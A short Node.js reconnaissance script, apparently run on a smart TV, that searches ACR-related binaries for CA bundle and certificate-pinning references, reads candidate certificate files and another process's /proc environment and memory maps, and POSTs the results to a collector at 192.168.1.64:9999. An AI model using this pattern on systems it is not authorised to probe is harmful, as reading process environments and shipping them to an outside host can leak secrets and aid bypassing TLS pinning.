"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 5000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
out.pem_refs = sh("grep -aoE '(/[A-Za-z0-9._-]+)+\\.pem' /usr/bin/acr /usr/lib/acr/libbonfire.so /usr/lib/libVDCurl.so.0.9 2>/dev/null | sort | uniq -c | sort -rn | head -20");
out.cert_words = sh("grep -aoE '[A-Za-z0-9_/\\.-]*(cacert|ca_bundle|CAINFO|CA_BUNDLE|capath|SSL_CERT|verify_peer|pinning)[A-Za-z0-9_/\\.-]*' /usr/bin/acr /usr/lib/acr/libbonfire.so /usr/lib/libVDCurl.so.0.9 2>/dev/null | sort | uniq -c | sort -rn | head -20");
out.cand_files = sh("for f in /usr/lib/acr/cert/ca.pem /opt/etc/fkp/data/config/cacert.pem /opt/share/ca-certificates/wss.pem /opt/var/lib/ca-certificates/ca-bundle.pem; do echo FILE:$f; md5sum $f 2>/dev/null; grep -c 'BEGIN CERTIFICATE' $f 2>/dev/null; head -2 $f 2>/dev/null; done");
out.acr_env = sh("tr '\\0' '\\n' < /proc/1902/environ 2>/dev/null | head -20; echo ---; cat /proc/1902/maps 2>/dev/null | head -15");
post("/acr_where_ca", out);
